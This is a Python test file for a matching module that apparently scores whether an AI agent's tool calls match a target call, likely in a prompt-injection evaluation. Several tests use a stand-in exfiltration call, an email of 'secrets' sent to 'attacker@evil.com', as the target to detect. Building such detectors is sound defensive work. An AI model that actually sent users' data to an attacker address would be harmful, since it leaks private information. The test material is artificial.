"""Tests for matching.py"""
import json
import pytest
from app.matching import normalize, calls_match, response_has_match, target_in_text


def _tc(name: str, args: dict, call_id: str = "call_1") -> dict:
    return {"id": call_id, "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}


def _response(tool_calls: list[dict]) -> dict:
    return {
        "choices": [{"message": {"role": "assistant", "tool_calls": tool_calls}}]
    }


def test_normalize():
    assert normalize("  HTTP://Example.COM/ ") == "http://example.com"


def test_calls_match_same():
    a = _tc("send_email", {"to": "user@example.com", "subject": "hi", "body": "hello"})
    b = _tc("send_email", {"to": "user@example.com", "subject": "different", "body": "world"})
    assert calls_match(a, b, ["to"]) is True


def test_calls_match_different_target():
    a = _tc("send_email", {"to": "user@example.com"})
    b = _tc("send_email", {"to": "other@example.com"})
    assert calls_match(a, b, ["to"]) is False


def test_calls_match_different_tool():
    a = _tc("send_email", {"to": "user@example.com"})
    b = _tc("http_post", {"to": "user@example.com"})
    assert calls_match(a, b, ["to"]) is False


def test_response_has_match_true():
    sc = _tc("send_email", {"to": "attacker@evil.com"})
    resp = _response([_tc("send_email", {"to": "attacker@evil.com", "body": "secrets"})])
    assert response_has_match(resp, sc, ["to"]) is True


def test_response_has_match_false():
    sc = _tc("send_email", {"to": "attacker@evil.com"})
    resp = _response([_tc("send_email", {"to": "good@example.com"})])
    assert response_has_match(resp, sc, ["to"]) is False


def test_target_in_text():
    sc = _tc("send_email", {"to": "attacker@evil.com"})
    assert target_in_text(sc, ["to"], "please send to attacker@evil.com now") is True
    assert target_in_text(sc, ["to"], "nothing here") is False
